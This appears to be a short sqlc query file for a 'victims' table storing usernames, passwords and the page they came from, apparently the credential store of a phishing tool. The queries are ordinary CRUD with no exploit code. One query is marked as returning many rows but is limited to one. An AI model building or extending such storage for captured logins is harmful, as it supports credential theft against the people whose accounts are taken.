-- name: CreateVictim :one
INSERT INTO victims (
        username,
        password,
        page,
        user_id
    )
VALUES (
        $1,
        $2,
        $3,
        $4
    )
RETURNING *;
-- name: GetVictimById :one
SELECT *
FROM victims
WHERE id = $1
LIMIT 1;
-- name: GetVictimsByUserId :many
SELECT *
FROM victims
WHERE user_id = $1
LIMIT 1;
-- name: GetAllVictims :one
SELECT COALESCE(JSON_AGG(victims), '[]')::json victims
FROM victims;
-- name: DeleteVictim :one
DELETE FROM victims
WHERE id = $1
RETURNING *;